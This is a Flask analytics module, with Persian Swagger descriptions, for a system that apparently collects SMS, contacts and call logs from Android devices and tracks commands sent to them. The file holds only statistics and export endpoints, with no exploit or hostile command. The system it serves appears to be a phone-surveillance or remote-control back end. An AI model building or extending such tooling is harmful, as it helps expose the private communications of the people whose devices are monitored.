from flask import Blueprint, request, jsonify
from flask_jwt_extended import jwt_required
from app import db
from app.models.device import Device
from app.models.data_collection import DataCollection, Contact, SMS, CallLog
from app.models.command import Command
from app.services.analytics_service import AnalyticsService
from app.utils.rate_limit import rate_limit
from app.utils.decorators import admin_required
from datetime import datetime, timedelta
import logging
from flasgger import swag_from

analytics_bp = Blueprint('analytics', __name__)
logger = logging.getLogger(__name__)

analytics_service = AnalyticsService()

@analytics_bp.route('/overview', methods=['GET'])
@jwt_required()
@rate_limit(limit=50, window=3600)
@swag_from({
    'tags': ['Analytics'],
    'summary': 'Get overview analytics',
    'description': 'آمار کلی سیستم (دستگاه‌ها، داده‌ها، دستورات، امنیت و ...)',
    'parameters': [
        {'name': 'days', 'in': 'query', 'type': 'integer', 'description': 'تعداد روزهای گذشته', 'required': False}
    ],
    'responses': {
        '200': {'description': 'آمار کلی', 'schema': {'type': 'object'}},
        '500': {'description': 'Internal server error'}
    }
})
def get_overview():
    """Get overview analytics"""
    try:
        # Get date range from query parameters
        days = request.args.get('days', 30, type=int)
        end_date = datetime.utcnow()
        start_date = end_date - timedelta(days=days)
        
        # Get basic statistics
        device_stats = Device.get_device_stats()
        data_stats = DataCollection.get_collection_stats()
        command_stats = Command.get_command_stats()
        
        # Get time-based analytics
        device_activity = analytics_service.get_device_activity(start_date, end_date)
        data_collection_trends = analytics_service.get_data_collection_trends(start_date, end_date)
        command_execution_trends = analytics_service.get_command_execution_trends(start_date, end_date)
        
        # Get security analytics
        security_stats = analytics_service.get_security_statistics()
        
        return jsonify({
            'period': {
                'start_date': start_date.isoformat(),
                'end_date': end_date.isoformat(),
                'days': days
            },
            'devices': device_stats,
            'data_collections': data_stats,
            'commands': command_stats,
            'activity': {
                'device_activity': device_activity,
                'data_collection_trends': data_collection_trends,
                'command_execution_trends': command_execution_trends
            },
            'security': security_stats
        }), 200
        
    except Exception as e:
        logger.error(f'Error getting overview analytics: {str(e)}')
        return jsonify({'error': 'Internal server error'}), 500

@analytics_bp.route('/devices', methods=['GET'])
@jwt_required()
@rate_limit(limit=100, window=3600)
@swag_from({
    'tags': ['Analytics'],
    'summary': 'Get device analytics',
    'description': 'آمار و روندهای تحلیلی دستگاه‌ها',
    'parameters': [
        {'name': 'days', 'in': 'query', 'type': 'integer', 'description': 'تعداد روزهای گذشته'},
        {'name': 'manufacturer', 'in': 'query', 'type': 'string', 'description': 'سازنده'},
        {'name': 'android_version', 'in': 'query', 'type': 'string', 'description': 'نسخه اندروید'}
    ],
    'responses': {
        '200': {'description': 'آمار دستگاه‌ها', 'schema': {'type': 'object'}},
        '500': {'description': 'Internal server error'}
    }
})
def get_device_analytics():
    """Get detailed device analytics"""
    try:
        # Get query parameters
        days = request.args.get('days', 30, type=int)
        manufacturer = request.args.get('manufacturer')
        android_version = request.args.get('android_version')
        
        end_date = datetime.utcnow()
        start_date = end_date - timedelta(days=days)
        
        # Get device distribution
        android_distribution = analytics_service.get_android_version_distribution()
        manufacturer_distribution = analytics_service.get_manufacturer_distribution()
        security_distribution = analytics_service.get_security_level_distribution()
        
        # Get device activity over time
        device_activity = analytics_service.get_device_activity(start_date, end_date)
        
        # Get device performance metrics
        performance_metrics = analytics_service.get_device_performance_metrics()
        
        # Get connection patterns
        connection_patterns = analytics_service.get_connection_patterns(start_date, end_date)
        
        return jsonify({
            'period': {
                'start_date': start_date.isoformat(),
                'end_date': end_date.isoformat(),
                'days': days
            },
            'distributions': {
                'android_versions': android_distribution,
                'manufacturers': manufacturer_distribution,
                'security_levels': security_distribution
            },
            'activity': device_activity,
            'performance': performance_metrics,
            'connections': connection_patterns
        }), 200
        
    except Exception as e:
        logger.error(f'Error getting device analytics: {str(e)}')
        return jsonify({'error': 'Internal server error'}), 500

@analytics_bp.route('/data', methods=['GET'])
@jwt_required()
@rate_limit(limit=100, window=3600)
@swag_from({
    'tags': ['Analytics'],
    'summary': 'Get data collection analytics',
    'description': 'آمار و روندهای جمع‌آوری داده',
    'parameters': [
        {'name': 'days', 'in': 'query', 'type': 'integer', 'description': 'تعداد روزهای گذشته'},
        {'name': 'data_type', 'in': 'query', 'type': 'string', 'description': 'نوع داده'}
    ],
    'responses': {
        '200': {'description': 'آمار داده‌ها', 'schema': {'type': 'object'}},
        '500': {'description': 'Internal server error'}
    }
})
def get_data_analytics():
    """Get data collection analytics"""
    try:
        # Get query parameters
        days = request.args.get('days', 30, type=int)
        data_type = request.args.get('data_type')
        
        end_date = datetime.utcnow()
        start_date = end_date - timedelta(days=days)
        
        # Get data collection trends
        collection_trends = analytics_service.get_data_collection_trends(start_date, end_date, data_type)
        
        # Get data type distribution
        type_distribution = analytics_service.get_data_type_distribution(start_date, end_date)
        
        # Get data volume statistics
        volume_stats = analytics_service.get_data_volume_statistics(start_date, end_date)
        
        # Get data collection success rates
        success_rates = analytics_service.get_data_collection_success_rates(start_date, end_date)
        
        # Get device data collection patterns
        device_patterns = analytics_service.get_device_data_patterns(start_date, end_date)
        
        return jsonify({
            'period': {
                'start_date': start_date.isoformat(),
                'end_date': end_date.isoformat(),
                'days': days
            },
            'trends': collection_trends,
            'type_distribution': type_distribution,
            'volume_statistics': volume_stats,
            'success_rates': success_rates,
            'device_patterns': device_patterns
        }), 200
        
    except Exception as e:
        logger.error(f'Error getting data analytics: {str(e)}')
        return jsonify({'error': 'Internal server error'}), 500

@analytics_bp.route('/commands', methods=['GET'])
@jwt_required()
@rate_limit(limit=100, window=3600)
@swag_from({
    'tags': ['Analytics'],
    'summary': 'Get command execution analytics',
    'description': 'آمار و روندهای اجرای دستورات',
    'parameters': [
        {'name': 'days', 'in': 'query', 'type': 'integer', 'description': 'تعداد روزهای گذشته'},
        {'name': 'command_type', 'in': 'query', 'type': 'string', 'description': 'نوع دستور'}
    ],
    'responses': {
        '200': {'description': 'آمار دستورات', 'schema': {'type': 'object'}},
        '500': {'description': 'Internal server error'}
    }
})
def get_command_analytics():
    """Get command execution analytics"""
    try:
        # Get query parameters
        days = request.args.get('days', 30, type=int)
        command_type = request.args.get('command_type')
        
        end_date = datetime.utcnow()
        start_date = end_date - timedelta(days=days)
        
        # Get command execution trends
        execution_trends = analytics_service.get_command_execution_trends(start_date, end_date, command_type)
        
        # Get command type distribution
        type_distribution = analytics_service.get_command_type_distribution(start_date, end_date)
        
        # Get command success rates
        success_rates = analytics_service.get_command_success_rates(start_date, end_date)
        
        # Get command execution times
        execution_times = analytics_service.get_command_execution_times(start_date, end_date)
        
        # Get device command patterns
        device_patterns = analytics_service.get_device_command_patterns(start_date, end_date)
        
        return jsonify({
            'period': {
                'start_date': start_date.isoformat(),
                'end_date': end_date.isoformat(),
                'days': days
            },
            'trends': execution_trends,
            'type_distribution': type_distribution,
            'success_rates': success_rates,
            'execution_times': execution_times,
            'device_patterns': device_patterns
        }), 200
        
    except Exception as e:
        logger.error(f'Error getting command analytics: {str(e)}')
        return jsonify({'error': 'Internal server error'}), 500

@analytics_bp.route('/security', methods=['GET'])
@jwt_required()
@admin_required
@rate_limit(limit=50, window=3600)
@swag_from({
    'tags': ['Analytics'],
    'summary': 'Get security analytics',
    'description': 'آمار و گزارش‌های امنیتی',
    'parameters': [
        {'name': 'days', 'in': 'query', 'type': 'integer', 'description': 'تعداد روزهای گذشته'}
    ],
    'responses': {
        '200': {'description': 'آمار امنیتی', 'schema': {'type': 'object'}},
        '500': {'description': 'Internal server error'}
    }
})
def get_security_analytics():
    """Get security analytics"""
    try:
        # Get query parameters
        days = request.args.get('days', 30, type=int)
        
        end_date = datetime.utcnow()
        start_date = end_date - timedelta(days=days)
        
        # Get security statistics
        security_stats = analytics_service.get_security_statistics()
        
        # Get security incidents
        security_incidents = analytics_service.get_security_incidents(start_date, end_date)
        
        # Get device security levels
        security_levels = analytics_service.get_device_security_levels()
        
        # Get threat analysis
        threat_analysis = analytics_service.get_threat_analysis(start_date, end_date)
        
        # Get compliance status
        compliance_status = analytics_service.get_compliance_status()
        
        return jsonify({
            'period': {
                'start_date': start_date.isoformat(),
                'end_date': end_date.isoformat(),
                'days': days
            },
            'statistics': security_stats,
            'incidents': security_incidents,
            'security_levels': security_levels,
            'threat_analysis': threat_analysis,
            'compliance': compliance_status
        }), 200
        
    except Exception as e:
        logger.error(f'Error getting security analytics: {str(e)}')
        return jsonify({'error': 'Internal server error'}), 500

@analytics_bp.route('/reports', methods=['GET'])
@jwt_required()
@admin_required
@rate_limit(limit=20, window=3600)
@swag_from({
    'tags': ['Analytics'],
    'summary': 'Get comprehensive reports',
    'description': 'دریافت گزارش‌های جامع (کلی، امنیتی، عملکرد)',
    'parameters': [
        {'name': 'type', 'in': 'query', 'type': 'string', 'enum': ['comprehensive', 'security', 'performance'], 'description': 'نوع گزارش'},
        {'name': 'days', 'in': 'query', 'type': 'integer', 'description': 'تعداد روزهای گذشته'}
    ],
    'responses': {
        '200': {'description': 'گزارش جامع', 'schema': {'type': 'object'}},
        '400': {'description': 'Invalid report type'},
        '500': {'description': 'Internal server error'}
    }
})
def get_reports():
    """Get comprehensive reports"""
    try:
        # Get query parameters
        report_type = request.args.get('type', 'comprehensive')  # comprehensive, security, performance
        days = request.args.get('days', 30, type=int)
        
        end_date = datetime.utcnow()
        start_date = end_date - timedelta(days=days)
        
        if report_type == 'comprehensive':
            report = analytics_service.generate_comprehensive_report(start_date, end_date)
        elif report_type == 'security':
            report = analytics_service.generate_security_report(start_date, end_date)
        elif report_type == 'performance':
            report = analytics_service.generate_performance_report(start_date, end_date)
        else:
            return jsonify({'error': 'Invalid report type'}), 400
        
        return jsonify({
            'report_type': report_type,
            'period': {
                'start_date': start_date.isoformat(),
                'end_date': end_date.isoformat(),
                'days': days
            },
            'generated_at': datetime.utcnow().isoformat(),
            'data': report
        }), 200
        
    except Exception as e:
        logger.error(f'Error generating report: {str(e)}')
        return jsonify({'error': 'Internal server error'}), 500

@analytics_bp.route('/export', methods=['POST'])
@jwt_required()
@admin_required
@rate_limit(limit=10, window=3600)
@swag_from({
    'tags': ['Analytics'],
    'summary': 'Export analytics data',
    'description': 'خروجی گرفتن از داده‌های آماری (CSV, JSON, Excel)',
    'parameters': [
        {
            'name': 'body',
            'in': 'body',
            'schema': {
                'type': 'object',
                'properties': {
                    'type': {'type': 'string', 'enum': ['csv', 'json', 'excel']},
                    'data_types': {'type': 'array', 'items': {'type': 'string'}},
                    'start_date': {'type': 'string'},
                    'end_date': {'type': 'string'}
                },
                'required': ['type', 'data_types']
            }
        }
    ],
    'responses': {
        '200': {
            'description': 'خروجی با موفقیت ایجاد شد',
            'schema': {
                'type': 'object',
                'properties': {
                    'message': {'type': 'string'},
                    'export_id': {'type': 'string'},
                    'download_url': {'type': 'string'},
                    'expires_at': {'type': 'string'}
                }
            }
        },
        '400': {'description': 'Export type and data types are required'},
        '500': {'description': 'Internal server error'}
    }
})
def export_analytics():
    """Export analytics data"""
    try:
        data = request.get_json()
        
        if not data:
            return jsonify({'error': 'No export configuration provided'}), 400
        
        export_type = data.get('type')  # csv, json, excel
        data_types = data.get('data_types', [])  # devices, data, commands, security
        start_date = data.get('start_date')
        end_date = data.get('end_date')
        
        if not export_type or not data_types:
            return jsonify({'error': 'Export type and data types are required'}), 400
        
        # Generate export
        export_data = analytics_service.export_data(
            export_type=export_type,
            data_types=data_types,
            start_date=start_date,
            end_date=end_date
        )
        
        return jsonify({
            'message': 'Export generated successfully',
            'export_id': export_data['export_id'],
            'download_url': export_data['download_url'],
            'expires_at': export_data['expires_at']
        }), 200
        
    except Exception as e:
        logger.error(f'Error exporting analytics: {str(e)}')
        return jsonify({'error': 'Internal server error'}), 500 